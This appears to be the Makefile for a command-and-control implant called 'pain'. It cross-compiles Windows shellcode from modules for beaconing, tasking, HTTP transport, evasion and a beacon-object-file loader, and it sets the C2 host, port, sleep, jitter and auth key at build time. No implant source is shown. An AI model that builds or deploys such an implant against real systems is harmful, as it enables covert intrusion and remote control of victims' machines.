# Toolchain
CC	= clang
CXX	= clang++
AS	= nasm

TARGET	= pain.x64.bin
OBJ_DIR	= Obj

# C2 build config defaults - override: make PAIN_C2_HOST=10.0.0.1 PAIN_C2_PORT=443
# (no shell quoting needed - the Makefile adds the C string quotes automatically)
PAIN_C2_HOST ?= 127.0.0.1
PAIN_C2_PORT ?= 8080
PAIN_SLEEP   ?= 5
PAIN_JITTER  ?= 0
PAIN_C2_SSL  ?= 0
PAIN_AUTH_MODE ?= 0
PAIN_AUTH_KEY  ?= 00000000000000000000000000000000
# UUID is now generated at agent runtime - no compile-time value needed

# Complier Flags - Cross-compile for windows
# \"...\" wraps string values so the shell passes literal quote chars to the compiler
CXXFLAGS = -target x86_64-w64-mingw32 \
		   -ffreestanding \
		   -fno-stack-protector \
		   -fno-exceptions \
		   -fno-rtti \
		   -nostdlib \
		   -O2 \
		   -IInclude \
		   -D_WIN64 \
		   -DPAIN_C2_HOST=\"$(PAIN_C2_HOST)\" \
		   -DPAIN_C2_PORT=$(PAIN_C2_PORT) \
		   -DPAIN_SLEEP=$(PAIN_SLEEP) \
		   -DPAIN_JITTER=$(PAIN_JITTER) \
		   -DPAIN_C2_SSL=$(PAIN_C2_SSL) \
		   -DPAIN_AUTH_MODE=$(PAIN_AUTH_MODE) \
		   -DPAIN_AUTH_KEY=\"$(PAIN_AUTH_KEY)\"


# Output file as a PE COFF object file
ASFLAGS	= -f win64

# Linker Flags
# -T : use our custom linker script to control section order
# --no-undefined : fail if any symbol is unresolved (catches missing .cc files)
# -s : strip debug symbols
LDFLAGS	= -T scripts/Linker.ld --no-undefined -s --image-base 0x0

# All c++ Object files - add a new line here for every new .cc file
ASM_OBJ = $(OBJ_DIR)/Entry.x64.o
CXX_OBJ = $(OBJ_DIR)/LdrLoad.o \
		  $(OBJ_DIR)/Main.o		\
		  $(OBJ_DIR)/Agent.o	\
		  $(OBJ_DIR)/Heap.o		\
		  $(OBJ_DIR)/Memory.o	\
		  $(OBJ_DIR)/Crypt.o	\
		  $(OBJ_DIR)/Package.o	\
		  $(OBJ_DIR)/Parser.o	\
		  $(OBJ_DIR)/Config.o    \
		  $(OBJ_DIR)/Http.o      \
		  $(OBJ_DIR)/Transport.o \
		  $(OBJ_DIR)/Tasks.o      \
		  $(OBJ_DIR)/Beacon.o     \
		  $(OBJ_DIR)/Bof.o        \
		  $(OBJ_DIR)/BeaconApi.o  \

all : dirs $(TARGET)

dirs:
	@mkdir -p $(OBJ_DIR)

# Compiler rules - one per source file
$(OBJ_DIR)/Entry.x64.o: Asm/Entry.x64.asm
	@echo "[ASM]  $<"
	@$(AS) $(ASFLAGS) $< -o $@

$(OBJ_DIR)/LdrLoad.o: Source/LdrLoad.cc
	@echo "[CXX]  $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Main.o: Source/Main.cc
	@echo "[CXX]  $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Agent.o: Source/Agent.cc
	@echo "[CXX]  $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Heap.o: Source/Internals/Heap.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Memory.o: Source/Internals/Memory.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Crypt.o: Source/Misc/Crypt.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Package.o: Source/Comm/Package.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Parser.o: Source/Comm/Parser.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Config.o: Source/Comm/Config.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Http.o: Source/Comm/Http.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Transport.o: Source/Comm/Transport.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Tasks.o: Source/Misc/Tasks.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Beacon.o: Source/Evasion/Beacon.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/Bof.o: Source/Misc/Bof.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJ_DIR)/BeaconApi.o: Source/Misc/BeaconApi.cc
	@echo "[CXX] $<"
	@$(CXX) $(CXXFLAGS) -c $< -o $@



# Link step:
# 1. ld produces a PE .exe (linker only knows PE format)
# 2. objcopy extracts raw .text bytes into the final .bin shellcode blob
$(TARGET): $(ASM_OBJ) $(CXX_OBJ)
	@echo "[LD]   linking $(OBJ_DIR)/pain.x64.exe"
	@x86_64-w64-mingw32-ld $(LDFLAGS) -o $(OBJ_DIR)/pain.x64.exe $(ASM_OBJ) $(CXX_OBJ)
	@echo "[BIN]  extracting shellcode -> $(TARGET)"
	@objcopy --dump-section .text=$(TARGET) $(OBJ_DIR)/pain.x64.exe
	@echo "[OK]   $(TARGET) ready"


clean:
	rm -rf $(OBJ_DIR) $(TARGET)